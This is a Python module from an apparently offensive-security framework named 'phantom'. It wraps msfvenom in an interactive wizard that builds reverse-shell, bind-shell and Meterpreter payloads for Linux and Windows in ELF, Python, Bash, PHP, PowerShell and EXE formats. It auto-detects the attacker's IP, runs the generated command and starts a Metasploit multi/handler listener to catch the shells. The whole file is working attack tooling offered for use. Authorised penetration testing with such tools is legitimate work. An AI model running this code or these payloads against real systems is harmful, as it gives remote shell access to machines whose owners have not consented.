"""
payload.py – msfvenom payload generator with automatic OS/LHOST detection.
"""

import socket
from phantom.modules.base_module import BaseModule
from phantom.core.executor import run_command
from phantom.core.session import session
from rich.console import Console

console = Console()

PAYLOAD_TYPES = {
    "1": ("linux/x64/shell_reverse_tcp", "Reverse shell TCP (Linux x64)"),
    "2": ("linux/x64/shell_bind_tcp", "Bind shell TCP (Linux x64)"),
    "3": ("linux/x64/meterpreter/reverse_tcp", "Meterpreter reverse TCP (Linux x64)"),
    "4": ("linux/x64/meterpreter/reverse_https", "Meterpreter reverse HTTPS (Linux x64)"),
    "5": ("windows/x64/shell_reverse_tcp", "Reverse shell TCP (Windows x64)"),
    "6": ("windows/x64/meterpreter/reverse_tcp", "Meterpreter reverse TCP (Windows x64)"),
}

FORMATS = {
    "1": ("elf", "ELF (Linux binary)"),
    "2": ("py", "Python"),
    "3": ("sh", "Bash one-liner"),
    "4": ("php", "PHP"),
    "5": ("ps1", "PowerShell"),
    "6": ("exe", "Windows EXE"),
}


class PayloadModule(BaseModule):
    module_name = "payload"

    def _get_lhost(self) -> str:
        """Auto-detect local IP address (most likely VPN/tun0 or eth0)."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"

    def _guess_os(self) -> str:
        """Try to guess target OS from scan results (stub)."""
        scan_data = session.get_result("scan")
        # In real implementation, we'd parse nmap OS detection.
        return "Linux x64"

    def do_generate(self, _):
        """Interactive payload generation wizard."""
        console.print("\n[bold]-- PAYLOAD GENERATOR --[/]\n")

        detected_os = self._guess_os()
        lhost = self._get_lhost()
        console.print("[green][+] Auto‑detected session info:[/]")
        console.print(f"    OS:   [cyan]{detected_os}[/]")
        console.print(f"    LHOST: [cyan]{lhost}[/]")
        console.print(f"    Target: [cyan]{session.target or 'unknown'}[/]\n")

        # Payload type selection
        for k, (_, desc) in PAYLOAD_TYPES.items():
            console.print(f"  [{k}] {desc}")
        payload_choice = input("\n  Payload type [1]: ").strip() or "1"
        payload, _ = PAYLOAD_TYPES.get(payload_choice, PAYLOAD_TYPES["1"])

        # Output format
        console.print()
        for k, (_, desc) in FORMATS.items():
            console.print(f"  [{k}] {desc}")
        fmt_choice = input("\n  Output format [1]: ").strip() or "1"
        fmt, _ = FORMATS.get(fmt_choice, FORMATS["1"])

        lport = input("  LPORT [4444]: ").strip() or "4444"
        out_file = input(f"  Output filename [shell.{fmt}]: ").strip() or f"shell.{fmt}"

        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o {out_file}"

        console.print(f"\n[+] Generated command:")
        console.print(f"[yellow]{cmd}[/]\n")
        console.print("  [1] Execute and start listener automatically")
        console.print("  [2] Show command only")
        console.print("  [3] Edit command before execution")

        action = input("\n  Choice [2]: ").strip() or "2"

        if action == "1":
            run_command(cmd)
            console.print(f"[green][+] Payload saved as {out_file}[/]")
            # Start listener (via handler module)
            self._start_listener(lport, payload)

        elif action == "2":
            console.print(f"\n  [yellow]{cmd}[/]\n")

        elif action == "3":
            new_cmd = input("  New command: ").strip()
            if new_cmd:
                run_command(new_cmd)

    def _start_listener(self, port: str, payload: str):
        """Spawn a Metasploit multi/handler in the background."""
        from phantom.modules.handler import HandlerModule
        console.print("[yellow][*] Starting listener (Metasploit multi/handler)...[/]")
        handler = HandlerModule()
        handler.start_listener(port, payload)

    def do_run(self, _):
        self.do_generate(_)

    def do_preview(self, _):
        self.do_generate(_)